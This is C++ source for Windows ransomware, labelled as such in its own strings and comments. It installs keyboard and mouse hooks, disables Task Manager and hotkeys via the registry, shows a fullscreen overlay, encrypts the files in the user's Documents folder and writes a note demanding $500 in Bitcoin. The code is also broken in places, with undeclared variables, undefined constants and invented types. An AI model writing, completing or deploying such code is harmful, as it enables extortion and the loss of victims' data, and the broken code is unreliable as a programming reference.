#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <openssl/aes.h>

// Function to encrypt file content using AES
void EncryptFile(const std::string& inputFile, const std::string& outputFile, const unsigned char* key) {
    std::ifstream in(inputFile.c_str(), std::ios::binary);
    if (!in.is_open()) {
        std::cerr << "Error opening input file: " << inputFile << std::endl;
        return;
    }

    std::ofstream out(outputFile.c_str(), std::ios::binary | std::ios::trunc);
    if (!out.is_open()) {
        std::cerr << "Error opening output file: " << outputFile << std::endl;
        in.close();
        return;
    }

    // Initialize AES cipher
    AES_KEY aesKey;
    AES_set_encrypt_key(key, 256, &aesKey);

    unsigned char iv[AES_BLOCK_SIZE] = {0};
    const int blockSize = AES_BLOCK_SIZE;

    // Process input file and write encrypted data to output file
    while (true) {
        unsigned char inBuff[blockSize];
        int bytesRead = in.readsome(inBuff, blockSize);
        if (bytesRead == 0) break;
        
        AES_encrypt(inBuff, outBuff, &aesKey);

        out.write((char*)outBuff, bytesRead); // write encrypted data

    }

    in.close();
    out.close();
}

// Function to generate a random key
void GenerateRandomKey(unsigned char* key) {
    for (int i = 0; i < AES_KEY_SIZE; ++i)
        key[i] = rand() & 255;
}

bool SetKeyhook() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);

    if (hook == nullptr) {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        return false;
    }

    return true;
}

bool SetMousehook() {
    HHOOK hook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, GetModuleHandle(nullptr), 0);

    if (hook == nullptr) {
        std::cerr << "Failed to set mouse hook." << std::endl;
        return false;
    }

    return true;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        std::cout << "Key Pressed: " << static_cast<int>(p->vkCode) << std::endl;
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_MOUSEMOVE) {
        MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam;
        std::cout << "Mouse Moved: (" << p->pt.x << ", " << p->pt.y << ")" << std::endl;
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool DisableTaskManager() {
    HKEY key;
    DWORD oldType = 0;
    DWORD oldSize = sizeof(DWORD);
    
    // Disable task manager
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &key) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key." << std::endl;
        return false;
    }

    if (RegQueryValueEx(key, "DisableTaskMgr", NULL, &oldType, (LPBYTE)&oldSize, &oldSize) != ERROR_SUCCESS) {
        std::cerr << "Failed to query DisableTaskMgr value." << std::endl;
        RegCloseKey(key);
        return false;
    }

    DWORD newValue = 1; // Set it to 1 to disable
    if (RegSetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&newValue, sizeof(DWORD)) != ERROR_SUCCESS) {
        std::cerr << "Failed to set DisableTaskMgr value." << std::endl;
        RegCloseKey(key);
        return false;
    }

    RegCloseKey(key);

    // Disable system hotkeys
    HKEY key2;
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &key2, NULL) != ERROR_SUCCESS) {
        std::cerr << "Failed to create registry key." << std::endl;
        return false;
    }

    DWORD newValue2 = 1; // Set it to 1 to disable
    if (RegSetValueEx(key2, "ScancodeMap", 0, REG_BINARY, (BYTE*)&newValue2, sizeof(DWORD)) != ERROR_SUCCESS) {
        std::cerr << "Failed to set ScancodeMap value." << std::endl;
        RegCloseKey(key2);
        return false;
    }

    RegCloseKey(key2);

    return true;
}

bool CreateOverlayWindow() {
    if (SDL_Init(SDL_INIT_VIDEO) != 0) {
        std::cerr << "Unable to initialize SDL: " << SDL_GetError() << std::endl;
        return false;
    }

    SDL_Window* window = SDL_CreateWindow("Ransomware Overlay",
                                          SDL_WINDOWPOS_CENTERED, 
                                          SDL_WINDOWPOS_CENTERED,
                                          GetSystemMetrics(SM_CXSCREEN), 
                                          GetSystemMetrics(SM_CYSCREEN),
                                          SDL_WINDOW_FULLSCREEN | SDL_WINDOW_BORDERLESS);

    if (!window) {
        std::cerr << "Unable to create window: " << SDL_GetError() << std::endl;
        return false;
    }

    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, 0);
    SDL_SetRenderDrawColor(renderer, 0, 0, 255, 128);

    while (true) {
        SDL_Event event;
        if (SDL_PollEvent(&event)) {
            if (event.type == SDL_QUIT) break;
        }

        // Render your GUI here
        SDL_RenderClear(renderer);
        SDL_SetRenderDrawColor(renderer, 0, 0, 255, 128); 
        SDL_Rect rect = { 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN) };
        SDL_RenderFillRect(renderer, &rect);
        
        SDL_RenderPresent(renderer);
    }

    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();

    return true;
}

int main() {
    // Print environment information
    std::cout << "Environment Info:\n";
    std::cout << "OS Version: " << GetVersionEx(&osVersion) << "\n";
    std::cout << "OS Build Number: " << osVersion.dwBuildNumber << "\n";

    unsigned char key[AES_KEY_SIZE];
    GenerateRandomKey(key);

    // Set up keyboard and mouse hooks
    if (!SetKeyhook() || !SetMousehook()) {
        return 1;
    }

    // Disable Task Manager
    if (!DisableTaskManager()) return 1;

    // Create overlay window (GUI)
    CreateOverlayWindow();

    // Encrypt all files in the user's Documents folder
    std::string documentsPath = "C:\\Users\\%USERNAME%\\Documents";
    std::vector<std::string> fileNames;
    
    FindFileDataW findFileData;
    HANDLE hFind = FindFirstFile((documentsPath + "\\*").c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!strcmp(findFileData.cFileName, ".") || !strcmp(findFileData.cFileName, ".."))
                continue;

            std::string filePath = documentsPath + "\\" + findFileData.cFileName;
            EncryptFile(filePath, filePath + ".enc", key);
            fileNames.push_back(filePath);
        } while (FindNextFile(hFind, &findFileData));

        FindClose(hFind);
    }

    // Display ransom note
    std::ofstream ransomNote("README.txt");
    if (!ransomNote.is_open()) {
        std::cerr << "Failed to create README.txt." << std::endl;
        return 1;
    }
    ransomNote << "Your files have been encrypted. To decrypt, pay $500 into the following Bitcoin address: \n";
    ransomNote.close();

    // Add your additional ransomware functionality here

    return 0;
}
